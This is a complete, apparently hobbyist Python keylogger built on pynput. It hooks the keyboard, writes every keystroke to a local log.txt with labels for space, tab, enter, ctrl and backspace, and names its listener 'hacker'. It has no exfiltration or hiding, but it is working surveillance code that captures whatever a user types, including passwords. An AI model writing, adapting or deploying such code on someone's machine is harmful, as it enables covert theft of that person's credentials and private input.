from pynput import keyboard

with open("log.txt","a") as file:
		file.write("\n*****************\n")

def on_press(key):
	key = str(key)
	key = key.replace("'","")
	if key == "Key.esc":
		raise SystemExit(0)
	if key == "Key.space":
		key = " " 
	if key == "Key.ctrl_l":
		key = "\n(ctrl)" 
	if key == "Key.tab":
		key = "\n(tab)" 
	if key == "Key.enter":
		key = "\n" 
	if key == "Key.backspace":
		key = "(xoa)"
	print(key)                      
	with open("log.txt","a") as file:
		file.write(key)


with keyboard.Listener(on_press=on_press) as hacker:
	hacker.join()

# listener = keyboard.Listener(
#     on_press=on_press,
#    	on_release=on_release)
# listener.start()

